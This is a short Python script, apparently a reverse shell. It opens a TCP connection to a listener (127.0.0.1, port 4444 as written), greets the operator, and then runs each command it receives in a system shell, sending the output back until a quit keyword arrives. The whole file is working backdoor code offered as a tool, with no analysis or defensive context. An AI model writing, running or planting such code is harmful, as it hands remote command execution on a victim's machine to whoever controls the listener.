import socket
import subprocess
import sys
HOST = "127.0.0.1"
PORT = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send("Knock knock.  Maybe I can be of some help?\n")

while 1:
    data = s.recv(1024)
    if data.rfind("fuck off") == 0:
        sys.exit()
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    s.send(stdout_value)
s.close()
